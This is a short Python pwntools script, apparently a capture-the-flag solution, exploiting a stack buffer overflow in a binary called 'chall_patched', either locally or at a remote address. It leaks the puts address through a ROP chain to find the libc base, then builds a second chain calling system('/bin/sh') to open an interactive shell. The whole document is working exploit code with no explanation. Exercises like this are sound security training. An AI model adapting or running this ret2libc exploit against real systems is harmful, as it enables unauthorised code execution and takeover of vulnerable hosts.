#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("117.53.46.98", 10000)

    return r


def main():
    r = conn()
    offset = 264
    rop = ROP(exe)
    rop.raw(b"A" * offset)
    rop.raw(0x00000000004011ad)
    rop.raw(exe.got['puts'])
    rop.raw(exe.plt['puts'])
    rop.raw(exe.sym['main'])
    r.sendline(rop.chain())
    r.recvline()
    puts_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
    print(f"puts leak: {hex(puts_leak)}")
    libc_base = puts_leak - 0x87be0
    libc.address = libc_base
    print(f"libc base: {hex(libc_base)}")
    # good luck pwning :)
    rop2 = ROP(libc)
    rop2.raw(b"A" * offset)
    rop2.raw(0x00000000004011ad)
    rop2.raw(next(libc.search(b'/bin/sh\x00')))
    rop2.raw(0x000000000040101a)
    rop2.raw(libc.sym['system'])
    r.sendline(rop2.chain())
    r.interactive()


if __name__ == "__main__":
    main()
